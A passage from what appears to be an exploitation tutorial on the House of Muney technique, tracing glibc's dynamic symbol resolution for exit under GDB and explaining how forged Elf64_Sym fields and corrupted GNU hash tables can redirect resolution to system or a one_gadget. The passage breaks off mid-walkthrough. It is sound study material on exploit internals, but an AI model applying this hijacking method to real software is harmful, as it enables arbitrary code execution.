+// $exit_sym = &$dynsym[$exit_index]
+
+This resolves to:
+
+(Elf64_Sym *)((char *)$dynsym + $exit_index * 0x18)
+
+At this point,
+$exit_symgives us full access to:
+
+$exit_sym->st_value→ offset of target function's resolved address against libc base
+
+$exit_sym->st_name→ offset of symbol name string into
+.dynstr
+
+(char *)$dynstr + $exit_sym->st_name→ actual symbol name string
+
+This lets us precisely validate or forge symbol table entries in memory — a pivotal capability for building the fake resolution structures used in House of Muney .
+
+st_value
+
+The
+st_valuefield is arguably the most critical member in a forged or hijacked
+.dynsymentry. It represents the offset of the function within the loaded shared object (here,
+libc.so.6). The actual function address at runtime is computed as:
+
+// GDB commands
+p/x $exit_sym->st_value
+
+In exploitation, this is the field we aim to control —by redirecting it to:
+
+A one_gadget RCE primitive
+
+The address of
+system,
+execve, or a backdoored function
+
+A fake or trampoline gadget controlled by us
+
+Inspecting the
+exitexample in GDB:
+
+pwndbg> p/x $exit_sym->st_value
+$14 = 0x46a40
+
+Which matches the offset shown by
+readelf:
+
+Num:    Value          Size Type    Bind   Vis      Ndx Name
+135: 0000000000046a40    32 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.2.5
+
+This value defines where in libc the linker will jump to once the symbol is resolved.
+
+Other fields in the struct (
+st_name,
+st_info,
+st_shndx, etc.) can be recovered or emulated with the reversed algorithm. But
+st_valueis the payload's launchpad—the one field that must be surgically precise to trigger code execution without crashing the dynamic linker.
+
+st_name
+
+The
+st_namefield in
+Elf64_Symdoesn't point to the symbol name directly—it holds an offset into
+.dynstr, the dynamic string table. To inspect it:
+
+// GDB commands
+p/x $exit_sym->st_name
+
+And resolve the actual symbol name:
+
+pwndbg> p/x $exit_sym->st_name
+$13 = 0x2efb
+
+pwndbg> x/s $dynstr + $exit_sym->st_name
+0x7ffff7de3d9b: "exit"
+
+To explore
+.dynstrcontents and symbol layout for a target like
+exit, we can use
+readelf -p .dynstrto dump
+.dynstrcontents with addresses relative to ELF memory layout :
+
+$ readelf -p .dynstr /lib/x86_64-linux-gnu/libc.so.6 | grep -C1 exit
+
+  [   cbe]  rresvport_af
+  [   ccb]  svc_exit
+  [   cd4]  setfsuid
+--
+  [   e50]  posix_spawn_file_actions_addclose
+  [   e72]  argp_err_exit_status
+  [   e87]  getgrgid_r
+--
+  [  16a1]  open_memstream
+  [  16b0]  pthread_exit
+  [  16bd]  sys_sigabbrev
+--
+  [  1997]  fputwc_unlocked
+  [  19a7]  __cxa_atexit
+  [  19b4]  clock_nanosleep
+--
+  [  2172]  dirfd
+  [  2178]  __cxa_thread_atexit_impl
+  [  2191]  get_kernel_syms
+--
+  [  2a4f]  ispunct
+  [  2a57]  on_exit
+  [  2a5f]  __strncasecmp_l
+--
+  [  2ee1]  wcstof
+  [  2ee8]  __cyg_profile_func_exit
+  [  2f00]  __sigsetjmp
+--
+  [  41f8]  sigprocmask
+  [  4204]  obstack_exit_failure
+  [  4219]  fputc
+--
+  [  4e35]  __mbsnrtowcs_chk
+  [  4e46]  __cxa_at_quick_exit
+  [  4e5a]  svc_getreq_poll
+
+From the output, we can confirm the offset (
+0x2efb) isn't pointing to a standalone
+"exit"string, but rather to the tail of a longer entry—specifically:
+
+[  2ee8]  __cyg_profile_func_exit
+
+The
+"exit"substring begins at offset:
+
+st_name = 0x2ee8 + strlen("__cyg_profile_func_") = 0x2ee8 + 0x13 = 0x2efb
+
+So the
+st_nameis just an offset into any null-terminated string that happens to contain "exit" , as long as it's aligned with the beginning of the name the symbol represents.
+
+In Exploitation , when forging a symbol table entry, we can either control a string buffer , e.g., place
+"exit"at
+0xdeadbeef00, then set:
+
+fake_st_name = 0xdeadbeef00 - dynstr_base
+
+Or just reuse an existing
+.dynstrstring , keeping the original
+st_nameunchanged to pass validation checks and avoid planting our own string entirely.
+
+Some valid suffixes from the previous
+readelf -p .dynstroutput:
+
+[   ccb]  svc_exit
+[  16b0]  pthread_exit
+[  19a7]  __cxa_atexit
+[  2ee8]  __cyg_profile_func_exit
+[  4e46]  __cxa_at_quick_exit
+
+Each of them contains a null-terminated
+"exit"at some position, making them viable reuse candidates for
+st_namewhen building a fake symbol.
+
+Just remember:
+st_nameis computed from virtual addresses , not file offsets:
+
+st_name = VA("exit") - VA(.dynstr)
+
+st_info
+
+st_infois a bit-packed byte that encodes two critical attributes of a symbol:
+
+(st_bind << 4) | (st_type)
+
+Where:
+
+st_bind(upper 4 bits): symbol binding — defines visibility and linkage
+
+st_type(lower 4 bits): symbol type — describes whether it's a function, object, section, etc.
+
+It's defined in the
+<elf.h>file at line 582 :
+
+C
+
+/* Legal values for ST_BIND subfield of st_info (symbol binding).  */
+
+#define STB_LOCAL	0		        /* Local symbol */
+#define STB_GLOBAL	1		      /* Global symbol */
+#define STB_WEAK	2		        /* Weak symbol */
+#define	STB_NUM		3		        /* Number of defined types.  */
+#define STB_LOOS	10		      /* Start of OS-specific */
+#define STB_GNU_UNIQUE	10		/* Unique symbol.  */
+#define STB_HIOS	12		      /* End of OS-specific */
+#define STB_LOPROC	13		    /* Start of processor-specific */
+#define STB_HIPROC	15		    /* End of processor-specific */
+
+/* Legal values for ST_TYPE subfield of st_info (symbol type).  */
+
+#define STT_NOTYPE	0		      /* Symbol type is unspecified */
+#define STT_OBJECT	1		      /* Symbol is a data object */
+#define STT_FUNC	2		        /* Symbol is a code object */
+#define STT_SECTION	3		      /* Symbol associated with a section */
+#define STT_FILE	4		        /* Symbol's name is file name */
+#define STT_COMMON	5		      /* Symbol is a common data object */
+#define STT_TLS		6		        /* Symbol is thread-local data object*/
+#define	STT_NUM		7		        /* Number of defined types.  */
+#define STT_LOOS	10		      /* Start of OS-specific */
+#define STT_GNU_IFUNC	10		  /* Symbol is indirect code object */
+#define STT_HIOS	12		      /* End of OS-specific */
+#define STT_LOPROC	13		    /* Start of processor-specific */
+#define STT_HIPROC	15		    /* End of processor-specific */
+
+In our example of the
+exitsymbol, its
+st_infovalue is
+0x12:
+
+pwndbg> p/x $exit_sym->st_info
+$15 = 0x12
+
+Binary breakdown:
+
+0x12 = 0b0001_0010
+      = (0x1 << 4) | 0x2
+      = STB_GLOBAL << 4 | STT_FUNC
+
+Decoded as:
+
+Binding :
+STB_GLOBAL→ symbol is globally visible and dynamically linkable
+
+Type :
+STT_FUNC→ symbol represents a function
+
+This matches
+readelf:
+
+Num:    Value          Size Type    Bind   Vis      Ndx Name
+135: 0000000000046a40    32 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.2.5
+
+→ "Type"
+FUNCand "Bind"
+GLOBALmatch exactly what
+0x12encodes.
+
+In a crafted PoC, we can replicate this structure by defining a macro:
+
+#define ELF64_ST_INFO(bind, type) (((bind) << 4) | ((type) & 0x0F))
+
+So for a global function like
+exit, use:
+
+st_info = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC)  // → 0x12
+
+When building fake
+.dynsymentries in House of Muney , matching this field ensures the symbol passes basic resolution checks — don't trigger alarms unless we mean to .
+
+st_other
+
+The
+st_otherfield encodes symbol visibility , used by the dynamic linker to determine how (or if) a symbol can be seen outside its defining shared object.
+
+Only the lowest 2 bits are significant; all higher bits must be zero .
+
+From
+<elf.h>at line 618 :
+
+C
+
+/* How to extract and insert information held in the st_other field.  */
+
+#define ELF32_ST_VISIBILITY(o)	((o) & 0x03)
+
+/* For ELF64 the definitions are the same.  */
+#define ELF64_ST_VISIBILITY(o)	ELF32_ST_VISIBILITY (o)
+
+/* Symbol visibility specification encoded in the st_other field.  */
+#define STV_DEFAULT	0		/* Default symbol visibility rules */
+#define STV_INTERNAL	1		/* Processor specific hidden class */
+#define STV_HIDDEN	2		/* Sym unavailable in other modules */
+#define STV_PROTECTED	3		/* Not preemptible, not exported */
+
+This means:
+
+Value Macro Meaning
+0x00 STV_DEFAULT Normal visibility (default)
+0x01 STV_INTERNAL Not used in dynamic linking
+0x02 STV_HIDDEN Not visible outside DSO
+0x03 STV_PROTECTED Visible but not preemptable
+In our example of
+exit, its
+st_othervalue is
+0:
+
+pwndbg> p/x $exit_sym->st_other<br>$16 = 0x0
+
+This means:
+
+Visibility:
+STV_DEFAULT(
+0x00)
+
+The symbol is globally exported and eligible for dynamic resolution by the linker
+
+This is expected for a symbol like
+exit, which must be externally visible from
+libc.so.6.
+
+In exploitation, for a fake
+Elf64_Sym, this field should almost always be:
+
+st_other = STV_DEFAULT;  // 0x00
+
+Using
+STV_HIDDENor
+STV_PROTECTEDcan cause the dynamic linker to skip the symbol entirely or treat it as non-preemptable, breaking the exploit chain. For House of Muney payloads, where we want the dynamic linker to resolve our hijacked symbol as if it were legit , stick to
+0x00.
+
+st_shndx
+
+TThe
+st_shndxfield in the
+Elf64_Symstructure tells us which section the symbol is associated with . It's a 2-byte field that can hold either:
+
+A real section index (e.g.,
+.text,
+.data, etc.), or
+
+A special constant defined in
+<elf.h>
+
+From
+<elf.hat line 413 :
+
+C
+
+/* Special section indices.  */
+
+#define SHN_UNDEF	0		/* Undefined section */
+#define SHN_LORESERVE	0xff00		/* Start of reserved indices */
+#define SHN_LOPROC	0xff00		/* Start of processor-specific */
+#define SHN_BEFORE	0xff00		/* Order section before all others
+					   (Solaris).  */
+#define SHN_AFTER	0xff01		/* Order section after all others
+					   (Solaris).  */
+#define SHN_HIPROC	0xff1f		/* End of processor-specific */
+#define SHN_LOOS	0xff20		/* Start of OS-specific */
+#define SHN_HIOS	0xff3f		/* End of OS-specific */
+#define SHN_ABS		0xfff1		/* Associated symbol is absolute */
+#define SHN_COMMON	0xfff2		/* Associated symbol is common */
+#define SHN_XINDEX	0xffff		/* Index is in extra table.  */
+#define SHN_HIRESERVE	0xffff		/* End of reserved indices */
+
+Some special section indices can be explained as:
+
+SHN_UNDEF (0x0000)→ symbol is undefined in the current object
+
+A normal section index (e.g.
+.text,
+.got, etc.)
+
+Special indices like:
+
+0xff00→
+SHN_LORESERVE
+
+0xfff1→
+SHN_ABS
+
+0xfff2→
+SHN_COMMON
+
+In our example for symbol
+exit:
+
+Num:    Value          Size Type    Bind   Vis      Ndx Name
+135: 0000000000046a40    32 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.2.5
+
+Section index (
+Ndx) is
+15, so:
+
+st_shndx = 0x000f;
+
+This means
+exitis defined inside libc , in section #15 , most likely
+.textor another executable region.
+
+In exploitation, we've got two strategic paths:
+
+Set
+st_shndx = 0(
+SHN_UNDEF) to force dynamic resolution from another object (common for symbols resolved via GOT/PLT)
+
+Set it to a real section index (like
+0xf) to mimic a legit, pre-resolved symbol already defined within the binary or shared object.
+
+In House of Muney PoC , the usual choice is:
+
+st_shndx = 0x000f;  // Copy from original symbol
+
+Because our goal is to spoof
+exitin a way that mirrors how
+systemwould be resolved—both residing in
+.textwithin libc. Reusing the correct section index ensures consistency and avoids triggering unnecessary resolution logic.
+
+However, if we want the symbol to be treated as undefined , so the dynamic linker resolves it from external libraries:
+
+st_shndx = SHN_UNDEF;  // Symbol requires resolution → triggers _dl_lookup_symbol_x
+
+This is useful when crafting a relocation that forces symbol lookup. It tells where the symbol is undefined—and that , in turn, guides linker to perform a custom symbol resolution.
+
+Pick based on where we are in the privilege chain.
+
+st_size
+
+What does
+st_sizerepresent?
+
+For functions : it's the declared length of the function in bytes — from
+st_value(entry point) to the approximate end of the function's code.
+
+For objects or variables : it reflects the size of the data in memory .
+
+But in practice, especially for glibc dynamic symbols like
+exit,
+printf,
+system, etc.,
+st_sizeis informational . The dynamic linker does not enforce or rely on it during symbol resolution or relocation.
+
+From our
+readelf -soutput:
+
+Num:    Value          Size Type    Bind   Vis      Ndx Name
+135: 0000000000046a40    32 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.2.5
+
+So:
+
+st_size = 0x20;  // 32 bytes
+
+This is the size of the
+exitsymbol — declared as 32 bytes (
+0x20) in the symbol table.
+
+But based on GDB disassembly:
+
+pwndbg> disass exit
+Dump of assembler code for function __GI_exit:
+0x00007ffff7e15a40 <+0>:     endbr64
+0x00007ffff7e15a44 <+4>:     push   rax
+0x00007ffff7e15a45 <+5>:     pop    rax
+0x00007ffff7e15a46 <+6>:     mov    ecx,0x1
+0x00007ffff7e15a4b <+11>:    mov    edx,0x1
+0x00007ffff7e15a50 <+16>:    lea    rsi,[rip+0x1a5cc1]        # 0x7ffff7fbb718 <__exit_funcs>
+0x00007ffff7e15a57 <+23>:    sub    rsp,0x8
+0x00007ffff7e15a5b <+27>:    call   0x7ffff7e157b0 <__run_exit_handlers>
+End of assembler dump.
+
+pwndbg> dist 0x00007ffff7e15a5b 0x00007ffff7e15a40
+0x7ffff7e15a5b->0x7ffff7e15a40 is -0x1b bytes (-0x4 words)
+
+So the actual machine code size is only 27 bytes (
+0x1b) — not
+0x20.
+
+st_size = 0x20in the symbol table is just an approximation — symbol sizes are not always exact byte counts of the function body. They're often aligned or padded by the compiler/linker, or made to cover potential instrumentation, epilogues, or IFUNC redirections.
+
+In exploitation, this is almost never important.
+
+The linker ignores
+st_size. We can safely do either:
+
+st_size = 0;         // Minimalist
+st_size = 0x20;      // Match original symbol
+
+In House of Muney PoCs or relocation forgery, it's fine to leave this field unset or imprecise — unless we're spoofing metadata for detection evasion or debugger inspection.
+
+All valid in exploit contexts like House of Muney . Use whatever fits our style— just don't crash the linker.
+
+GNU Hash Offsets
+
+Modern glibc uses the GNU hash table to accelerate symbol resolution. Internally, this structure is embedded inside
+struct link_map, as defined in
+<link.h>:
+
+C
+
+struct link_map {
+  ElfW(Addr) l_addr;                   // Base address of the object
+  char *l_name;                        // Path to the object
+  ElfW(Dyn) *l_ld;                     // .dynamic section pointer
+  struct link_map *l_next, *l_prev;    // Linked list of loaded objects
+  ...
+
+  /* GNU hash-related fields */
+  const Elf32_Word *l_gnu_buckets;
+  const Elf32_Word *l_gnu_chain_zero;
+  const Elf64_Addr *l_gnu_bitmask;
+  unsigned int l_nbuckets;
+  unsigned int l_gnu_shift;
+  unsigned int l_gnu_bitmask_idxbits;
+  ...
+};
+
+These fields govern how
+dl_lookup_symbol_x()and
+do_lookup_x()perform resolution. For exploit development, especially House of Muney , they're prime overwrite targets .
+
+Once you identify the correct
+link_map(e.g., for
+libc.so.6), we can inspect these fields directly:
+
+// GDB commands
+p/x $libc->l_gnu_bitmask
+p/x $libc->l_gnu_buckets
+p/x $libc->l_gnu_chain_zero
+p   $libc->l_nbuckets
+
+They reveal how glibc traverses the GNU hash data to find a symbol:
+
+l_gnu_bucketsis a table of indices.
+
+These indices are not symbol indices directly , but rather offsets into the
+l_gnu_chain_zeroarray .
+
+l_gnu_chain_zerois the start of the GNU hash "chain" section.
+
+The value at
+l_gnu_chain_zero[bucket]is compared against the target symbol's hash.
+
+In House of Muney , our actual target is the
+hasharr.
+
+But there is no separate
+hasharrfield in
+link_map. It is just a runtime alias :
+
+const Elf32_Word *hasharr = &map->l_gnu_chain_zero[bucket];
+
+It's just a pointer math expression into the
+l_gnu_chain_zeroarray — not a dedicated field — used temporarily by the lookup code.
+
+By corrupting:
+
+l_gnu_buckets→ change the hash resolution entry point
+
+l_gnu_chain_zero→ change how glibc walks the chain
+
+l_gnu_bitmask→ bypass Bloom filter checks
+
+l_nbuckets→ control the size boundary of resolution
+
+Demo "exit"
+
+As covered earlier, the House of Muney technique doesn't require crafting a new symbol — it can hijack an existing one . A perfect candidate:
+"exit".
+
+Why
+exit?
+
+It's present in the dynamic symbol table (
+.dynsym)
+
+It's typically not called before
+main()returns
+
+So its GOT entry remains unresolved , meaning:
+The first call triggers the PLT stub →
+plt[0]→
+_dl_runtime_resolve
+
+This triggers the full symbol resolution chain :
+_dl_fixup→
+_dl_lookup_symbol_x→
+do_lookup_x
+
+This makes
+exitan ideal host for House of Muney — especially when redirecting symbol resolution using GNU hash corruption. Any other unresolved PLT symbol in the target binary is equally viable.
+
+We need the symbol table index of
+exit:
+
+Bash
+
+readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep ' exit@@'
+
+Example output in glibc 2.31:
+
+135: 0000000000046a40    32 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.2.5
+
+So:
+
+exithas symbol index
+135(but is
+2760in glibc 2.35, and so forth)
+
+The resolver will access
+.dynsym[135]when binding the symbol
+
+Using the existed
+exitfrom its corresponding
+.dynsymtable, without writing or injecting a new symbol — we can simply reprogram the path to resolution.
+
+Environment
+
+In this section, we'll walk through the key structures involved in GNU hash-based symbol resolution — particularly as they relate to the
+exitsymbol.
+
+Lab environment:
+
+Target:
+exit@GLIBC_2.2.5
+
+Version: glibc 2.31
+
+Architecture:
+x86_64
+
+Tooling:
+GDB+
+pwndbg,
+readelf,
+objdump
+
+This foundation sets us up for inspecting and manipulating GNU hash internals to redirect control flow at resolution time — without introducing new symbols.
+
+Runtime Resolver
+
+To observe the runtime behavior behind House of Muney , we can use a minimalistic target binary:
+
+C
+
+#include <stdlib.h>
+
+int main() {
+    exit(0);
+}
+
+Compiled under glibc 2.31 with lazy binding enabled :
+
+Bash
+
+gcc -g -Wl,-z,lazy -o observe observe.c
+
+As expected, the call to
+exit()triggers the PLT stub:
+
+► 0x555555555149 <main>                  endbr64
+  0x55555555514d <main+4>                push   rbp
+  0x55555555514e <main+5>                mov    rbp, rsp
+  0x555555555151 <main+8>                mov    edi, 0
+  0x555555555156 <main+13>               call   exit@plt                <exit@plt>
+
+If it's eagerly resolved at load time by the dynamic loader during program startup, we can compile the binary with the
+-Wl,-z,lazyflags for lazy binding.
+
+Stepping in, it hits the PLT trampoline, invoking
+_dl_runtime_resolve_xsavecas mentioned:
+
+  0x555555555054 <exit@plt+4>                       bnd jmp qword ptr [rip + 0x2fbd]     <0x555555555030>
+  ↓
+  0x555555555030                                    endbr64
+  0x555555555034                                    push   0
+  0x555555555039                                    bnd jmp 0x555555555020               <0x555555555020>
+  ↓
+  0x555555555020                                    push   qword ptr [rip + 0x2fe2]      <_GLOBAL_OFFSET_TABLE_+8>
+► 0x555555555026                                    bnd jmp qword ptr [rip + 0x2fe3]     <_dl_runtime_resolve_xsavec>
+  ↓
+  0x7ffff7fe7bc0 <_dl_runtime_resolve_xsavec>       endbr64
+  0x7ffff7fe7bc4 <_dl_runtime_resolve_xsavec+4>     push   rbx
+
+From here, glibc enters
+_dl_fixup, which leads directly to
+_dl_lookup_symbol_xto resolve the target symbol. Registers at that moment:
+
+► 0x7ffff7fe0192 <_dl_fixup+210>    call   _dl_lookup_symbol_x                <_dl_lookup_symbol_x>
+      rdi: 0x55555555447b ◂— 0x635f5f0074697865 /* 'exit' */
+      rsi: 0x7ffff7ffe190 —▸ 0x555555554000 ◂— 0x10102464c457f
+      rdx: 0x7fffffffe068 —▸ 0x555555554428 ◂— 0x120000000b /* '\x0b' */
+      rcx: 0x7ffff7ffe4f8 —▸ 0x7ffff7ffe450 —▸ 0x7ffff7fc1520 —▸ 0x7ffff7ffe190 —▸ 0x555555554000 ◂— ...
+      r8: 0x7ffff7fc1570 —▸ 0x5555555544a1 ◂— 'GLIBC_2.2.5'
+      r9: 0x1
+      arg[6]: 0x1
+      arg[7]: 0x0
+
+Internally, it invokes the final resolver —
+do_lookup_x:
+
+► 0x7ffff7fdb1ec <_dl_lookup_symbol_x+284>    call   do_lookup_x                <do_lookup_x>
+      rdi: 0x55555555447b ◂— 0x635f5f0074697865 /* 'exit' */
+      rsi: 0x7c967e3f
+      rdx: 0x7fffffffdfc0 ◂— 0xffffffff
+      rcx: 0x555555554428 ◂— 0x120000000b /* '\x0b' */
+      r8: 0x7fffffffdfd0 ◂— 0x0
+      r9: 0x7ffff7ffe450 —▸ 0x7ffff7fc1520 —▸ 0x7ffff7ffe190 —▸ 0x555555554000 ◂— 0x10102464c457f
+      arg[6]: 0x0
+      arg[7]: 0x7ffff7fc1570 —▸ 0x5555555544a1 ◂— 'GLIBC_2.2.5'
+      arg[8]: 0x1
+      arg[9]: 0x0
+      arg[10]: 0x1
+      arg[11]: 0x7ffff7ffe190 —▸ 0x555555554000 ◂— 0x10102464c457f
+
+Prototype of
+do_lookup_x:
+
+C
+
+do_lookup_x(
+    const char *undef_name,              // RDI
+    unsigned int new_hash,               // RSI
+    unsigned long int *old_hash,         // RDX
+    const ElfW(Sym) *ref,                // RCX
+    struct sym_val *result,              // R8
+    struct r_scope_elem *scope,          // R9
+    size_t i,                            // [rsp + 0x08]
+    const struct r_found_version *version, // [rsp + 0x10]
+    int flags,                           // [rsp + 0x18]
+    struct link_map *skip,               // [rsp + 0x20]
+    int type_class,                      // [rsp + 0x28]
+    struct link_map *undef_map           // [rsp + 0x30]
+)
+
+Just before the
+call, these registers contain:
+
+rdi→
+undef_name:
+0x55555555447b→
+"exit"
+
+rsi→
+new_hash:
+0x7c967e3f(calculated by
+_dl_new_hash("exit"))
+
+rdx→
+old_hash: pointer to 64-bit value:
+0xffffffff(not used)
+
+rcx→
+ref: pointer to
+Elf64_Sym
+
+r8→
+result: pointer to
+sym_valstruct
+
+r9→
+scope: pointer to
+r_scope_elem
+
+This is where the GNU hash table is actually walked , and where
+l_gnu_buckets,
+l_gnu_chain_zero, and the
+Elf64_Symentries are queried — where our forged symbol payload is selected and dereferenced by glibc's dynamic linker.
+
+Symbols Inspection
+
+To understand how House of Muney pivots symbol resolution in real-time, we observe what glibc sees during the
+_dl_lookup_symbol_x()→
+do_lookup_x()cascade.
+
+Now set up the resolver
+scope— this is where glibc will search:
+
+pwndbg> set $scope = (struct r_scope_elem *)$r9
+
+pwndbg> p *$scope
+$2 = {
+    r_list = 0x7ffff7fc1520,
+    r_nlist = 3
+}
+
+pwndbg> p $scope->r_list[0]
+$3 = (struct link_map *) 0x7ffff7ffe190
+
+It holds 3 sets of
+r_list— the dynamic linker will scan through
+r_list[0]to
+r_list[2].
+
+Inspect the candidates:
+
+pwndbg> p (char *)((struct link_map *)$scope->r_list[0])->l_name
+$4 = 0x7ffff7ffe730 ""
+
+pwndbg> p (char *)((struct link_map *)$scope->r_list[1])->l_name
+$5 = 0x7ffff7ffee10 "/lib/x86_64-linux-gnu/libc.so.6"
+
+pwndbg> p (char *)((struct link_map *)$scope->r_list[2])->l_name
+$6 = 0x555555554318 "/lib64/ld-linux-x86-64.so.2"
+
+Each of them is a
+link_mapstruct. We've identified:
+
+r_list[1]is libc.so.6 — our target
+
+r_list[2]is ld.so
+
+r_list[0]is the main binary (empty string because it was loaded via
+execve())
+
+We now anchor libc:
+
+// GDB commands
+set $libc = (struct link_map *)$scope->r_list[1]
+
+Next, we can access the dynamic symbol table and string table from the libc
+link_map:
+
+pwndbg> set $DT_SYMTAB=6
+
+pwndbg> set $DT_STRTAB=5
+
+pwndbg> p/x $libc->l_info[$DT_SYMTAB]->d_un.d_ptr
+$7 = 0x7ffff7dd3070
+
+pwndbg> p/x $libc->l_info[$DT_STRTAB]->d_un.d_ptr
+$8 = 0x7ffff7de0ea0
+
+Set up their base addresses as the entrances for later use:
+
+pwndbg> set $dynsym = (Elf64_Sym *)$libc->l_info[$DT_SYMTAB]->d_un.d_ptr
+
+pwndbg> set $strtab = (char *)$libc->l_info[$DT_STRTAB]->d_un.d_ptr
+
+Now inspect the target
+exitsymbol:
+
+pwndbg> set $exit_index = 135
+
+pwndbg> set $exit_sym = &$dynsym[$exit_index]
+
+pwndbg> p/x $exit_sym->st_value
+$9 = 0x46a40
+
+pwndbg> p/x $exit_sym->st_name
+$10 = 0x2efb
+
+pwndbg> x/s $strtab + $exit_sym->st_name
+0x7ffff7de3d9b: "exit"
+
+Matches exactly:
+
+$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep ' exit@@'
+135: 0000000000046a40    32 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.2.5
+
+Extract the other members of the exit
+.dynsymstructure:
+
+pwndbg> p/x $exit_sym->st_info
+$11 = 0x12
+
+pwndbg> p/x $exit_sym->st_others
+$12 = 0
+
+pwndbg> p/x $exit_sym->st_shndx
+$13 = 0xf
+
+pwndbg> p/x $exit_sym->st_size
+$14 = 0x20
+
+We now hold a full copy of a live
+Elf64_Symentry for
+exit, verified from both runtime and static analysis.
+
+Finally, inspect those GNU hash internals :
+
+pwndbg> p/x $libc->l_gnu_bitmask
+$7 = 0x7ffff7dcf3c8
+
+pwndbg> p/x $libc->l_gnu_buckets
+$8 = 0x7ffff7dcfbc8
+
+pwndbg> p/x $libc->l_gnu_chain_zero
+$9 = 0x7ffff7dd0b64
+
+pwndbg> p/x $libc->l_nbuckets
+$10 = 0x3f3 (1011)
+
+These are the lookup tables that House of Muney seeks to corrupt.
+
+Next, we step into
+do_lookup_xwith this symbol as a resolution target. From there, House of Muney aims to redirect the GNU hash resolution logic to hit a fake one — hijacking resolution without ever touching the GOT — before that, we should have a clear perspective on the legitimate workflow.
+
+Inside do_lookup_x
+
+Once execution lands inside
+do_lookup_x, glibc begins evaluating whether a given symbol might exist in a shared object — using a fast filter stage driven by the Bloom-style bitmask table.
+
+We can debug this live by importing the source code of
+ld.soto GDB, or match against glibc source .
+
+bitmask_word
+
+The process continues with a dereference of the
+bitmask_word:
+
+This corresponds to the following C logic in
+<dl-lookup.c>at line 413 :
+
+C
+
+if (__glibc_likely (bitmask != NULL))
+    {
+      ElfW(Addr) bitmask_word
+        = bitmask[(new_hash / __ELF_NATIVE_CLASS)
+              & map->l_gnu_bitmask_idxbits];
+
+      unsigned int hashbit1 = new_hash & (__ELF_NATIVE_CLASS - 1);
+      unsigned int hashbit2 = ((new_hash >> map->l_gnu_shift)
+                   & (__ELF_NATIVE_CLASS - 1));
+
+      	if (__glibc_unlikely ((bitmask_word >> hashbit1)
+                & (bitmask_word >> hashbit2) & 1))
+[...]
+
+This is precisely what we observe at instruction
+<do_lookup_x+241>:
+
+ASM
+
+mov    rax, qword ptr [rax + rdx*8]
+
+At this point:
+
+$rax =
+$libc->l_gnu_bitmask= 0x7ffff7dcf3c8
+
+$rdx =
+hash_index= 0xf8
+
+This matches:
+
+bitmask_word = bitmask[(new_hash / 64) & l_gnu_bitmask_idxbits]
+
+Which means:
+
+bitmask_word = ((Elf64_Addr *)$rax)[0xf8]
+
+Calculating the exact memory address:
+
+RAX = 0x7ffff7dcf3c8 + 0xf8 * 8
+    = 0x7ffff7d8db88
+
+Inspecting that address in GDB gives us:
+
+f8:07c0│  0x7ffff7dcfb88 ◂— 0xf000028c0200130e
+
+So the actual runtime value of
+bitmask_wordis
+0xf000028c0200130e.
+
+This value is used in the following check:
+
+if ((bitmask_word >> hashbit1) & (bitmask_word >> hashbit2) & 1)
+
+Once this value is forged to always return a positive result, any hash can slip past the filter — even if it's fake.
+
+bucket
+
+Continue stepping through
+do_lookup_x, and we reach the point where the GNU hash bucket index is resolved:
+
+This corresponds to the logic at line 426 :
+
+Elf32_Word bucket = map->l_gnu_buckets[new_hash
+                 		% map->l_nbuckets];
+
+At runtime, this computation begins from
+<do_lookup_x+752>:
+
+mov    rax, rdi         ; rax = new_hash = 0x7c967e3f
+xor    edx, edx         ; rdx = 0
+div    rsi              ; rsi = nbuckets = 0x3f3
+
+This calculates:
+
+rdx = new_hash % nbuckets
+    = 0x7c967e3f % 0x3f3
+    = 58
+    = 0x3a
+
+The bucket index is now
+0x3a.
+
+Next at
+<do_lookup_x+760>, glibc loads the bucket table pointer:
+
+ASM
+
+mov    rax, qword ptr [rbx + 0x308]
+
+Which resolves to:
+
+rax = map->l_gnu_buckets
+	= *(rbx + 0x308)
+	= 0x7ffff7dcfbc8
+
+This is the base of the bucket array (
+Elf32_Word *) — 32 bits.
+
+Then we fetch the actual bucket value:
+
+ASM
+
+mov    eax, dword ptr [rax + rdx*4]
+
+This translates to:
+
+bucket = ((Elf32_Word *)0x7ffff7dcfbc8)[0x3a]
+
+In GDB:
+
+pwndbg> set $bucket_base = 0x7ffff7dcfbc8
+
+pwndbg> tel $buckets_base+(0x3a*4)
+00:0000│  0x7ffff7dcfcb0 ◂— 0x8900000086
+01:0008│  0x7ffff7dcfcb8 ◂— 0x8f0000008c
+02:0010│  0x7ffff7dcfcc0 ◂— 0x9200000090
+03:0018│  0x7ffff7dcfcc8 ◂— 0x96
+04:0020│  0x7ffff7dcfcd0 ◂— 0x9b00000098
+
+pwndbg> p *((Elf32_Word *)$buckets_base + 0x3a)
+$15 = 134 (0x86)
+
+So
+bucket = 0x86.
+
+Interestingly,
+exithas symbol index
+135:
+
+Num:    Value          Size Type    Bind   Vis      Ndx Name
+135: 0000000000046a40    32 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.2.5
+
+So this bucket leads almost directly to the
+exitsymbol — just one offset away — but we will see its "true" bucket actually matches
+135(0x87) in the following workflow.
+
+P.S. in glibc 2.35, this value equals to
+2760— the exact symbol index for
+"exit@@GLIBC_2.2.5".
+
+hasharr
+
+Once the
+bucketis verified (non-zero), glibc transitions into the GNU hash chain phase — resolving symbols by walking the
+l_gnu_chain_zeroarray starting at the bucket index.
+
+This logic is shown in the source at line 428 :
+
+C
+
+if (bucket != 0)
+    {
+      const Elf32_Word *hasharr = &map->l_gnu_chain_zero[bucket];
+
+      do
+        if (((*hasharr ^ new_hash) >> 1) == 0)
+          {
+        symidx = ELF_MACHINE_HASH_SYMIDX (map, hasharr);
+        sym = check_match (undef_name, ref, version, flags,
+                   type_class, &symtab[symidx], symidx,
+                   strtab, map, &versioned_sym,
+                   &num_versions);
+        if (sym != NULL)
+          goto found_it;
+          }
+      while ((*hasharr++ & 1u) == 0);
+    }
+
+IIn GDB, glibc dereferences this
+hasharrat:
+
+This happens at
+do_lookup_x+803:
+
+ASM
+
+lea    r14, [rdx + rax*4]
+
+Which sets:
+
+const Elf32_Word *hasharr = &map->l_gnu_chain_zero[bucket];
+
+We previously established:
+
+bucket = 0x86
+
+l_gnu_chain_zero = 0x7ffff7dd0b64
+
+So:
+
